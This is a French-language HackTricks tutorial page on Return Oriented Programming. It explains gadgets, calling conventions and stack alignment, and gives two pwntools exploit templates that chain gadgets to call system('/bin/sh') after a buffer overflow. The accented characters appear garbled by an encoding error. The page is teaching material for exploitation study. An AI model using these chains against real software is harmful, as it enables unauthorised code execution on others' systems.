# ROP - Return Oriented Programing

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **Informations de base**

**La programmation orient√©e retour (ROP)** est une technique d'exploitation avanc√©e utilis√©e pour contourner les mesures de s√©curit√© telles que **No-Execute (NX)** ou **Data Execution Prevention (DEP)**. Au lieu d'injecter et d'ex√©cuter du shellcode, un attaquant exploite des morceaux de code d√©j√† pr√©sents dans le binaire ou dans les biblioth√®ques charg√©es, appel√©s **"gadgets"**. Chaque gadget se termine g√©n√©ralement par une instruction `ret` et effectue une petite op√©ration, telle que le d√©placement de donn√©es entre les registres ou l'ex√©cution d'op√©rations arithm√©tiques. En encha√Ænant ces gadgets, un attaquant peut construire une charge utile pour effectuer des op√©rations arbitraires, contournant ainsi efficacement les protections NX/DEP.

### Fonctionnement de ROP

1. **D√©tournement du flux de contr√¥le** : Tout d'abord, un attaquant doit d√©tourner le flux de contr√¥le d'un programme, g√©n√©ralement en exploitant un d√©passement de tampon pour √©crire par-dessus une adresse de retour sauvegard√©e sur la pile.
2. **Encha√Ænement de gadgets** : L'attaquant s√©lectionne soigneusement et encha√Æne des gadgets pour effectuer les actions souhait√©es. Cela pourrait impliquer la configuration des arguments pour un appel de fonction, l'appel de la fonction (par exemple, `system("/bin/sh")`), et la gestion de tout nettoyage n√©cessaire ou d'op√©rations suppl√©mentaires.
3. **Ex√©cution de la charge utile** : Lorsque la fonction vuln√©rable retourne, au lieu de retourner √† un emplacement l√©gitime, elle commence √† ex√©cuter la cha√Æne de gadgets.

### Outils

Typiquement, les gadgets peuvent √™tre trouv√©s en utilisant [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) ou directement depuis **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Exemple de cha√Æne ROP en x86

### **Conventions d'appel x86 (32 bits)**

* **cdecl** : L'appelant nettoie la pile. Les arguments de fonction sont pouss√©s sur la pile dans l'ordre inverse (de droite √† gauche). **Les arguments sont pouss√©s sur la pile de droite √† gauche.**
* **stdcall** : Similaire √† cdecl, mais c'est le destinataire qui est responsable du nettoyage de la pile.

### **Recherche de gadgets**

Tout d'abord, supposons que nous avons identifi√© les gadgets n√©cessaires dans le binaire ou ses biblioth√®ques charg√©es. Les gadgets qui nous int√©ressent sont :

* `pop eax; ret` : Ce gadget d√©pile la valeur sup√©rieure de la pile dans le registre `EAX` puis retourne, nous permettant de contr√¥ler `EAX`.
* `pop ebx; ret` : Similaire au pr√©c√©dent, mais pour le registre `EBX`, permettant de contr√¥ler `EBX`.
* `mov [ebx], eax; ret` : D√©place la valeur dans `EAX` vers l'emplacement m√©moire point√© par `EBX` puis retourne. C'est souvent appel√© un **gadget write-what-where**.
* De plus, nous avons l'adresse de la fonction `system()` disponible.

### **Cha√Æne ROP**

En utilisant **pwntools**, nous pr√©parons la pile pour l'ex√©cution de la cha√Æne ROP comme suit en visant √† ex√©cuter `system('/bin/sh')`, notez comment la cha√Æne commence par :

1. Une instruction `ret` √† des fins d'alignement (facultatif)
2. Adresse de la fonction `system` (en supposant que l'ASLR est d√©sactiv√© et que la libc est connue, plus d'informations dans [**Ret2lib**](ret2lib/))
3. Placeholder pour l'adresse de retour de `system()`
4. Adresse de la cha√Æne `"/bin/sh"` (param√®tre pour la fonction system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Exemple de cha√Æne ROP en x64

### **Conventions d'appel x64 (64 bits)**

* Utilise la convention d'appel **System V AMD64 ABI** sur les syst√®mes de type Unix, o√π les **six premiers arguments entiers ou pointeurs sont pass√©s dans les registres `RDI`, `RSI`, `RDX`, `RCX`, `R8` et `R9`**. Les arguments suppl√©mentaires sont pass√©s sur la pile. La valeur de retour est plac√©e dans `RAX`.
* La convention d'appel **Windows x64** utilise `RCX`, `RDX`, `R8` et `R9` pour les quatre premiers arguments entiers ou pointeurs, les arguments suppl√©mentaires √©tant pass√©s sur la pile. La valeur de retour est plac√©e dans `RAX`.
* **Registres**: Les registres 64 bits incluent `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` et `R8` √† `R15`.

#### **Recherche de gadgets**

Pour notre objectif, concentrons-nous sur les gadgets qui nous permettront de d√©finir le registre **RDI** (pour passer la cha√Æne **"/bin/sh"** en argument √† **system()**) puis d'appeler la fonction **system()**. Supposons que nous avons identifi√© les gadgets suivants :

* **pop rdi; ret** : D√©pile la valeur sup√©rieure de la pile dans **RDI** puis retourne. Essentiel pour d√©finir notre argument pour **system()**.
* **ret** : Un simple retour, utile pour l'alignement de la pile dans certains sc√©narios.

Et nous connaissons l'adresse de la fonction **system()**.

### **Cha√Æne ROP**

Voici un exemple utilisant **pwntools** pour configurer et ex√©cuter une cha√Æne ROP visant √† ex√©cuter **system('/bin/sh')** en **x64** :
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
Dans cet exemple :

* Nous utilisons le gadget **`pop rdi; ret`** pour d√©finir **`RDI`** sur l'adresse de **`"/bin/sh"`**.
* Nous sautons directement √† **`system()`** apr√®s avoir d√©fini **`RDI`**, avec l'adresse de **system()** dans la cha√Æne.
* Le gadget **`ret_gadget`** est utilis√© pour l'alignement si l'environnement cible le n√©cessite, ce qui est plus courant en **x64** pour assurer un alignement correct de la pile avant d'appeler des fonctions.

### Alignement de la pile

**L'ABI x86-64** garantit que la **pile est align√©e sur 16 octets** lorsqu'une **instruction call** est ex√©cut√©e. **LIBC**, pour optimiser les performances, **utilise des instructions SSE** (comme **movaps**) qui n√©cessitent cet alignement. Si la pile n'est pas correctement align√©e (ce qui signifie que **RSP** n'est pas un multiple de 16), les appels √† des fonctions comme **system** √©choueront dans une **cha√Æne ROP**. Pour corriger cela, ajoutez simplement un **gadget ret** avant d'appeler **system** dans votre cha√Æne ROP.

## Diff√©rence principale entre x86 et x64

{% hint style="success" %}
Puisque **x64 utilise des registres pour les premiers arguments**, il n√©cessite souvent moins de gadgets que x86 pour des appels de fonction simples, mais trouver et cha√Æner les bons gadgets peut √™tre plus complexe en raison du nombre accru de registres et de l'espace d'adressage plus grand. Le nombre accru de registres et l'espace d'adressage plus grand dans l'architecture **x64** offrent √† la fois des opportunit√©s et des d√©fis pour le d√©veloppement d'exploits, en particulier dans le contexte de la Programmation Orient√©e Retour (ROP).
{% endhint %}

## Exemple de cha√Æne ROP en ARM64

### **Bases ARM64 & Conventions d'appel**

Consultez la page suivante pour ces informations :

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}



## Protections contre la ROP

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/) : Ces protections rendent plus difficile l'utilisation de la ROP car les adresses des gadgets changent entre les ex√©cutions.
* [**Canaris de pile**](../common-binary-protections-and-bypasses/stack-canaries/) : En cas de d√©passement de tampon, il est n√©cessaire de contourner les canaris de pile pour √©craser les pointeurs de retour afin d'exploiter une cha√Æne ROP.
* **Manque de Gadgets** : S'il n'y a pas suffisamment de gadgets, il ne sera pas possible de g√©n√©rer une cha√Æne ROP.

## Techniques bas√©es sur la ROP

Remarquez que la ROP est juste une technique pour ex√©cuter du code arbitraire. Bas√© sur la ROP, de nombreuses techniques Ret2XXX ont √©t√© d√©velopp√©es :

* **Ret2lib** : Utilise la ROP pour appeler des fonctions arbitraires √† partir d'une biblioth√®que charg√©e avec des param√®tres arbitraires (g√©n√©ralement quelque chose comme `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall** : Utilise la ROP pour pr√©parer un appel √† un syscall, par exemple `execve`, et lui faire ex√©cuter des commandes arbitraires.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining** : Le premier exploitera EBP au lieu de EIP pour contr√¥ler le flux et le second est similaire √† Ret2lib mais dans ce cas, le flux est principalement contr√¥l√© avec les adresses EBP (bien qu'il soit √©galement n√©cessaire de contr√¥ler EIP).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Autres exemples et r√©f√©rences

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bits, Pie et nx activ√©, pas de canari, √©crasement de RIP avec une adresse `vsyscall` dans le seul but de retourner √† l'adresse suivante dans la pile qui sera un √©crasement partiel de l'adresse pour obtenir la partie de la fonction qui divulgue le drapeau
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, pas d'ASLR, gadget ROP pour rendre la pile ex√©cutable et sauter au shellcode dans la pile
